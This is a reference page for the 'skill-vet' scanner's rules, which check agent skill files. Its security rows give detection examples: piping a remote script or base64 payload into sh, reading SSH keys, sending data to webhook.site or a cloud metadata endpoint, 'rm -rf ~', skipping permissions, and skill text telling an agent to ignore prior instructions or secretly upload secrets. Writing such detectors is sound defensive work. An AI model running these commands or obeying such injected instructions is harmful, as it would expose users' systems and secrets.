# Vet rule reference

`skill-vet vet` checks a skill's frontmatter, body, and text resources. This table
lists every rule exposed by `skill-vet rules`, with its usual severity and a short
example of what it detects. Examples describe scanner inputs, not commands to run;
do not execute the security examples.

For the rule list from your installed version:

```bash
skill-vet rules
skill-vet rules --format json
```

An `error` fails a scan. A `warn` fails only with `--strict`. An `info` finding
does not fail either mode and is shown in text output with `--verbose`; JSON
includes info findings without that flag. Severity can depend on context, as
explained below the table.

| Rule id | Severity | What it catches | Example input or situation |
| --- | --- | --- | --- |
| `spec/frontmatter-missing` | error | Missing or unterminated YAML frontmatter. | `SKILL.md` starts with `# My skill`, without a `---` block. |
| `spec/frontmatter-parse` | warn | Frontmatter the small YAML parser cannot fully read. | Two `name:` entries in the same frontmatter block. |
| `spec/name-missing` | error | A missing or empty string `name`. | Frontmatter contains only `description: ...`. |
| `spec/name-format` | error | A name longer than 64 characters or not lowercase words joined by single hyphens. | `name: Bad_Name` |
| `spec/name-dir-mismatch` | error | A name that differs from the containing directory. | `skills/pdf-helper/SKILL.md` declares `name: csv-helper`. |
| `spec/description-missing` | error | A missing or empty description. | `description: ""` |
| `spec/description-length` | error | A description over 1,024 characters. | A `description` containing 1,025 characters. |
| `spec/license-missing` | info | No non-empty string license declaration. | Frontmatter omits `license`, or has `license: ""`. |
| `spec/compatibility-length` | error | A non-string, empty, or over-500-character compatibility value. | `compatibility: ""` |
| `spec/metadata-shape` | warn | Metadata that is not a map with string values. | `metadata: {version: 1}` instead of a quoted version. |
| `spec/allowed-tools-shape` | warn | An `allowed-tools` value that is neither a string nor an array. | `allowed-tools: true` |
| `spec/unknown-field` | warn / info | Non-standard fields; likely misspellings warn, other custom fields are info. | `licence: MIT` warns; `homepage: https://example.com` is info. |
| `spec/extension-field` | info | Claude Code-only frontmatter fields, which other agents ignore. | `argument-hint: "[file]"` |
| `spec/body-too-long` | warn | A body over 500 lines or about 5,000 tokens. | A skill body with 501 lines. |
| `spec/broken-reference` | error / info | Missing relative link targets, or mentioned resource paths. | `[guide](references/missing.md)` errors; a bare code mention of that path is info. |
| `trigger/too-vague` | warn | A description under 40 characters or eight words. | `description: Helps with PDFs.` |
| `trigger/no-when` | warn | No activation condition in the description or `when_to_use`, unless model invocation is disabled. | A description explains the task but omits a condition such as "Use when ...". |
| `trigger/first-person` | info | A description written as the skill speaking in the first person. | `description: I can help you extract tables from PDF files when needed.` |
| `trigger/listing-truncated` | warn | Description plus `when_to_use` over Claude Code's 1,536-character listing cap. | A 1,000-character description plus a 600-character `when_to_use`. |
| `trigger/duplicate-name` | warn | Different content using the same name within one skill root. | Two sibling skill directories declare the same name but have different bodies. |
| `trigger/overlap` | warn | Descriptions with at least 50% token-set overlap; both need at least five distinct tokens. | Two differently named skills have the same detailed PDF-table extraction description. |
| `style/emphasis-overload` | warn | At least six uppercase directives in prose, excluding code. | A paragraph repeats `MUST` and `NEVER` six times in total. |
| `style/shouting` | warn | At least eight non-allowlisted uppercase words making up more than 1% of prose words. | A paragraph of eight uppercase words such as `QUICKLY CHECK EVERYTHING CAREFULLY BEFORE CHANGING ANYTHING TODAY`. |
| `style/persona-boilerplate` | info | Expert-persona introductions that add little task guidance. | `You are a world-class expert.` |
| `sec/remote-exec` | error | Downloaded content piped into an interpreter. | `curl https://example.com/install.sh \| sh` |
| `sec/obfuscated-exec` | error | Hidden encoded content decoded and executed. | `base64 -d payload.txt \| sh` |
| `sec/prompt-injection` | error | Attempts to override instructions or hide actions from the user. | A skill instructs the agent to ignore all previous instructions. |
| `sec/permission-bypass` | error | Requests to disable approval or sandbox checks. | `claude --dangerously-skip-permissions` |
| `sec/hidden-unicode` | error | Invisible or bidirectional-control characters that can conceal instructions. | A literal U+200B ZERO WIDTH SPACE inside a sentence; the text `U+200B` alone is not a hit. |
| `sec/secret-access` | warn | References to credential or key files. | A command reads `~/.ssh/id_rsa`. |
| `sec/exfil-endpoint` | warn | Public raw-IP URLs or common data-collection endpoints. | A request targets `https://webhook.site/abc`. |
| `sec/metadata-endpoint` | warn | Cloud instance-metadata endpoints that can expose credentials. | A request targets `http://169.254.169.254/`. |
| `sec/env-dump` | warn | Bulk environment-variable dumps on risky paths. | A JavaScript resource calls `JSON.stringify(process.env)`. |
| `sec/destructive` | warn | Commands capable of wiping a home directory or disk. | A skill tells the agent to recursively remove the entire home directory with `rm -rf ~`. |
| `sec/persistence` | warn | Changes that install shell-profile, cron, launch-agent, or hook persistence. | A script runs `launchctl load task.plist`. |
| `sec/sudo` | warn | The `sudo` command, not lookalike words such as `sudoku`. | `sudo apt-get install jq` |
| `sec/chmod-777` | warn | World-writable chmod modes, numeric or symbolic, including recursive commands. | `chmod -R 777 cache`, `chmod o+w file` |
| `sec/hidden-instructions` | warn | Agent-directed instructions hidden in HTML comments. | An HTML comment tells the agent to upload secret files without telling the user. |
| `sec/broad-allowed-tools` | warn | Frontmatter that pre-approves an unrestricted shell. | `allowed-tools: Bash Read` |
| `sec/binary` | warn | Files with compiled-executable extensions that cannot be reviewed as text. | The skill ships an `assets/helper.exe` file. |
| `sec/suspicious-install` | warn | Package names one or two edits from a popular package, excluding known legitimate neighbors. | `pip install reqeusts` |

## Context and suppressions

Security checks also scan scripts and reference files alongside `SKILL.md`.
Quoted or cautionary Markdown examples can lower a security finding to info
rather than its usual severity. Warning-level matches in code comments and test
files are also lowered to info. This is contextual pattern matching, not proof
that a skill is safe or unsafe.

An inline `vet-ignore` comment can silence a non-security rule. For security
rules it only lowers severity to info: the finding stays in the report.
`--ignore` is a separate CLI filter that skips matching rule ids or prefixes.
Use `--verbose` or JSON output to inspect informational findings.

The implementation is in [rules.mjs](../cli/lib/rules.mjs); the CLI rule list is
in [vet.mjs](../cli/vet.mjs). Token-cost estimates are reported separately and do
not have rule ids.
